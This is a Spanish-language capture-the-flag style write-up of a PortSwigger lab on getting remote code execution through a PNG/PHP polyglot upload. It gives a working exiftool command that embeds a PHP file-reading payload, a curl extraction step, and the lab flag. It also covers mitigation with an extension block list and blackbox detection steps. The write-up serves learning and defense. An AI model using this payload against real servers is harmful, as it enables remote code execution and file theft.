---
title: "Lab: Remote code execution via polyglot web shell upload"
date: 2026-06-07
category: "File Upload"
order: 8
tags: ["web-security-academy", "file-upload", "lab", "rce", "polyglot"]
layout: layouts/writeup.njk
permalink: /writeups/file-upload-lab-polyglot-web-shell.html
---

## Descripción

El servidor valida que el contenido del archivo subido sea realmente una imagen — no solo confía en la extensión o el Content-Type. Para bypassear esto, se crea un **polyglot**: un archivo que simultáneamente es una imagen PNG válida **y** contiene código PHP ejecutable en sus metadatos EXIF.

---

## Reconocimiento

- El endpoint de subida de avatar rechaza archivos que no sean imágenes reales con el mensaje: *"file is not a valid image"*.
- Cambiar solo la extensión (`.php`) o el Content-Type no sirve — el servidor lee los **magic bytes** del contenido.
- Al acceder a `/files/avatars/`, los archivos `.php` sí se ejecutan (igual que en labs anteriores).

---

## Intentos fallidos

### Intento 1 — Subir BasicWebShell.php directamente

Subir el web shell puro sin disfrazarlo devuelve:

```
"Sorry, file type php is not allowed Only jpg and png files."
```

**Lo que el desarrollador hizo bien:** valida el contenido real del archivo, no solo la extensión o el header HTTP.

```python
import imghdr
file_type = imghdr.what(file_obj)  # Lee magic bytes del archivo
if file_type not in ['jpeg', 'png']:
    return "file is not a valid image"
```

> **¿Qué son los magic bytes?** Los primeros bytes de un archivo identifican su tipo real. PNG siempre empieza con `89 50 4E 47` (`\x89PNG`). JPEG con `FF D8 FF`. El servidor usa esto en lugar de confiar en el nombre o Content-Type.

---

## Bypass exitoso — Polyglot con exiftool

En Kali, se crea un polyglot insertando el payload PHP en el campo Comment de los metadatos EXIF de una imagen PNG real:

```bash
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" imagen.png -o polyglot.php
```

Verificación de que sigue siendo un PNG válido:

```bash
xxd polyglot.php | head
# 89 50 4e 47  ← magic bytes PNG intactos al inicio
```

Se sube `polyglot.php` → el servidor lo acepta porque los magic bytes son PNG válidos.

Se accede a `/files/avatars/polyglot.php` → el servidor lo ejecuta como PHP y devuelve la flag entre los bytes binarios de la imagen.

Para extraer la flag del output binario:

```bash
curl -s [URL]/files/avatars/polyglot.php --cookie "session=..." | strings | grep -v PNG
# Output:
# tEXtComment
# 2aCaNmK3b1KBAjv2v9Hr8QswuPDxq8V7   ← flag
```

> **Técnica de delimitadores (más práctica):** el payload oficial de PortSwigger usa delimitadores explícitos para aislar la flag del ruido binario:
>
> ```php
> <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
> ```
>
> Con esto, en el response de Burp se puede usar Ctrl+F y buscar `START` — la flag aparece exactamente entre `START` y `END` sin necesidad de `strings` ni ninguna herramienta externa.

**Flag:** `2aCaNmK3b1KBAjv2v9Hr8QswuPDxq8V7`

---

## Por qué funcionó

El servidor valida el tipo de archivo leyendo los magic bytes del inicio del archivo. Un polyglot preserva esos magic bytes PNG al inicio, por lo que la validación pasa. Sin embargo, el servidor luego ejecuta el archivo como PHP (porque la extensión es `.php`), y PHP procesa el código embebido en los metadatos EXIF y lo ejecuta.

---

## Error del desarrollador

Validar solo el inicio del archivo (magic bytes) sin verificar que **todo el contenido** sea una imagen legítima. El archivo puede ser simultáneamente válido como PNG y ejecutable como PHP.

```python
# Validación incompleta — solo verifica los primeros bytes
if not file_content[:4] == b'\x89PNG':
    return "not a valid image"
# ...pero luego lo ejecuta como PHP si la extensión es .php
```

---

## Mitigación

```python
import imghdr, os

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png'}
BLOCKED_EXTENSIONS = {'php', 'phtml', 'php3', 'php5', 'phar', 'shtml'}

ext = filename.rsplit('.', 1)[-1].lower()

if ext in BLOCKED_EXTENSIONS:
    return "Extension not allowed"

if imghdr.what(file_obj) not in ['jpeg', 'png']:
    return "Not a valid image"

# Además: guardar en directorio que NO ejecute scripts
# y renombrar el archivo con UUID al guardarlo
```

La defensa en profundidad requiere: bloquear extensiones ejecutables + validar contenido + configurar el servidor para no ejecutar archivos en el directorio de uploads + renombrar archivos al guardarlos.

---

## Impacto

RCE completo en el servidor. Un atacante puede leer archivos arbitrarios, ejecutar comandos del sistema, escalar privilegios o establecer una reverse shell — exactamente igual que el primer lab de RCE, pero bypaseando una capa adicional de validación.

---

## Cómo identificarlo en blackbox

1. Subir imagen normal → confirmar que acepta PNG/JPG.
2. Subir `.php` puro → observar mensaje de error (revela qué valida: extensión, Content-Type, o contenido).
3. Si el error dice "not a valid image" → sospechar validación de magic bytes → probar polyglot.
4. Crear polyglot con exiftool e intentar subir con extensión `.php`.
5. Acceder al archivo subido e inspeccionar si hay ejecución PHP en el output.

---

## Preguntas frecuentes

**¿En casos reales siempre obtendremos un mensaje que diga que no es el tipo de archivo esperado?** No necesariamente. Algunas aplicaciones fallan silenciosamente (rechazan sin mensaje), otras muestran mensajes genéricos de error del servidor, y otras aceptan el archivo pero lo guardan sin ejecutarlo. En un pentest real podrías encontrar solo un HTTP 400 o 422 sin detalles. La estrategia es la misma: si la extensión y el Content-Type no funcionan, probar polyglot.

**¿Por qué el output del polyglot tiene bytes binarios mezclados con la flag?** Porque PHP ejecuta el código pero el resto del archivo sigue siendo datos binarios del PNG. PHP devuelve todo el contenido del archivo incluyendo los bytes de la imagen. Por eso se necesita `strings` para aislar el texto legible.

**¿exiftool es la única forma de crear un polyglot?** No. También se puede hacer manualmente con un editor hex, agregando el payload PHP después de los magic bytes PNG pero antes del resto de la imagen. exiftool es simplemente la forma más práctica porque reutiliza un campo de metadatos legítimo (EXIF Comment) que PNG soporta nativamente como chunk `tEXt`.
